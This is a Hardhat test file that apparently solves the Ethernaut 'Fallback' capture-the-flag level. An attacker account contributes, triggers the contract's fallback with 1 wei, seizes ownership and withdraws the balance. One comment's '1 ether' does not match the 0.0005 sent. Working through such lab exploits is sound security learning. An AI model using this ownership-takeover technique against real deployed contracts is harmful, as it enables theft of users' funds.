const { assert } = require("chai")
const { deployments, ethers } = require("hardhat")

describe("01-Fallback", async function () {
    let deployer, attacker, fallback
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]
        await deployments.fixture(["01"])
        fallback = await ethers.getContract("Fallback")
    })
    it("should transfer ownership to attacker", async function () {
        const owner = await fallback.owner()
        assert.equal(owner, deployer.address)

        // deployer deposits 1 ether
        const contribution = ethers.utils.parseEther("0.0005")
        await fallback.contribute({ value: contribution })

        // attacker steals ownership and eth
        await fallback.connect(attacker).contribute({ value: contribution })
        await attacker.sendTransaction({
            to: fallback.address,
            value: "1", // 1 wei
        })
        // attacker is now the owner
        const newOwner = await fallback.owner()
        assert.equal(newOwner, attacker.address)
        await fallback.connect(attacker).withdraw()
    })
})
